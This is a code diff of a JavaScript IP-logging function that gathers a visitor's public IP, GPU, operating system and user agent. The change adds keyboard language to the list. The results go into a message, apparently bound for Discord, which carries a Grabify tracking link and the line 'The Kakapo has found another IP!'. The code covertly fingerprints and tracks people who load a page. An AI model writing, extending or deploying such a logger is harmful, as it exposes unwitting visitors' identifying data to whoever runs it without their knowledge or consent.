@@ -99,10 +99,11 @@ async function logIP() {
     const ip = await getPublicIPAddress();
     const graphCard = getVideoCardInfo().renderer;
     const userOS = getOperatingSystem(); // Use the updated function for OS detection.
-    const userAgent = navigator.userAgent    
+    const userAgent = navigator.userAgent  
+    const kbLang = navigator.language  
 
 
-    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}\n User Agent: ${userAgent}`;
+    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}\n User Agent: ${userAgent}\n Keyboard Language: ${kbLang}`;
 
     const msg = {
       content: message
